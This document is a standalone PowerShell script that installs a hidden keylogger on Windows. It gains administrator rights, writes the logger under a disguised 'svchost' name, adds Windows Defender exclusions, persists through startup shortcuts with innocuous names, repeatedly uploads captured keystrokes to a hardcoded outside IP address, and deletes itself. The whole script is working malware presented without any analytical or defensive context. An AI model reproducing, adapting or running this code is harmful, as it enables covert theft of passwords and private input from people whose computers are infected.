# Demand and Ensure Administrator Privileges
$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb RunAs -ArgumentList $arguments
    exit
}

# Define paths using environment variables for portability
$payloadPath = "$env:LOCALAPPDATA\Temp\svchost13117.ps1"
$logFile = "$env:LOCALAPPDATA\Temp\key_log.txt"
$transferScriptPath = "$env:LOCALAPPDATA\Temp\file_transfer.ps1"
$startupFolder = "$env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs\StartUp"

#Create the keylogger script content
$keyloggerScript = @"
`$logFile = "$logFile"
`$timeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
Add-Content -Path `$logFile -Value "`r`n--- Log Session Started: `$timeStamp ---`r`n" -ErrorAction SilentlyContinue
`$signature = '
    using System; using System.Runtime.InteropServices; using System.Text;
    namespace Win32 {
        public static class User32 {
            public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
            [DllImport("user32.dll", SetLastError=true)] public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
            [DllImport("user32.dll", SetLastError=true)] public static extern bool UnhookWindowsHookEx(IntPtr hhk);
            [DllImport("user32.dll", SetLastError=true)] public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        }
        public static class Kernel32 { [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr GetModuleHandle(string mod); }
    }'
Add-Type -TypeDefinition `$signature
Add-Type -AssemblyName System.Windows.Forms
`$callback = {
    param(`$nCode, `$wParam, `$lParam)
    if (`$nCode -ge 0 -and `$wParam -eq 0x0100) {
        `$keyName = ([System.Windows.Forms.Keys]([System.Runtime.InteropServices.Marshal]::ReadInt32(`$lParam))).ToString()
        [System.IO.File]::AppendAllText(`$script:logFile, "`$keyName ")
    }
    return [Win32.User32]::CallNextHookEx(`$hook, `$nCode, `$wParam, `$lParam)
}
`$hook = [Win32.User32]::SetWindowsHookEx(13, `$callback, [Win32.Kernel32]::GetModuleHandle([System.Diagnostics.Process]::GetCurrentProcess().MainModule.ModuleName), 0)
if (`$hook -eq [IntPtr]::Zero) {
    exit
}
try {
    while (`$true) {
        [System.Windows.Forms.Application]::DoEvents()
        Start-Sleep -Milliseconds 100
    }
} finally {
    [Win32.User32]::UnhookWindowsHookEx(`$hook)
}
"@

#Create the payload file and set it hidden
Set-Content -Path $payloadPath -Value $keyloggerScript -Force
Set-ItemProperty -Path $payloadPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

#Create the log file and set it hidden
New-Item -Path $logFile -ItemType File -Force
Set-ItemProperty -Path $logFile -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

#Add Windows Security Exclusion for the payload
Add-MpPreference -ExclusionPath $payloadPath

#Create a shortcut in the startup folder for the keylogger
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$startupFolder\SystemCoreAudio.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payloadPath`""
$Shortcut.Save()

#Start the keylogger immediately for the current session
$startArguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payloadPath`""
Start-Process -FilePath 'powershell.exe' -ArgumentList $startArguments

# Create the file transfer script content using Invoke-WebRequest
$transferScript = @"
`$sourceFile = "$logFile"
`$uploadUri = "http://87.107.54.161:8080/"
`$fileName = "key_logger.txt"

function Transfer-File {
    try {
        Invoke-WebRequest -Uri `$uploadUri -Method POST -InFile `$sourceFile -Headers @{"X-Filename"=`$fileName} -ErrorAction Stop
        return `$true
    } catch {
        return `$false
    }
}

while (`$true) {
    `$nextTransferTime = (Get-Date).AddHours(0.03)
    while ((Get-Date) -lt `$nextTransferTime) {
        Start-Sleep -Seconds 50  # Check every 10 minutes
        if (Transfer-File) {
            break
        }
    }
    while (-not (Transfer-File)) {
        Start-Sleep -Seconds 50  # Retry every 10 minutes
    }
}
"@

# Create the transfer script file and set it hidden
Set-Content -Path $transferScriptPath -Value $transferScript -Force
Set-ItemProperty -Path $transferScriptPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

#Add Windows Security exclusion for the transfer script
Add-MpPreference -ExclusionPath $transferScriptPath

#Create a shortcut in the startup folder for the transfer script
$transferShortcut = $WshShell.CreateShortcut("$startupFolder\FileTransfer.lnk")
$transferShortcut.TargetPath = "powershell.exe"
$transferShortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$transferScriptPath`""
$transferShortcut.Save()

# Start the transfer script immediately for the current session
$transferStartArguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$transferScriptPath`""
Start-Process -FilePath 'powershell.exe' -ArgumentList $transferStartArguments

# Self-deletion mechanism
Start-Process -FilePath "cmd.exe" -ArgumentList "/c timeout /t 1 /nobreak >nul & del /f /q `\"$($MyInvocation.MyCommand.Path)\""" -WindowStyle Hidden
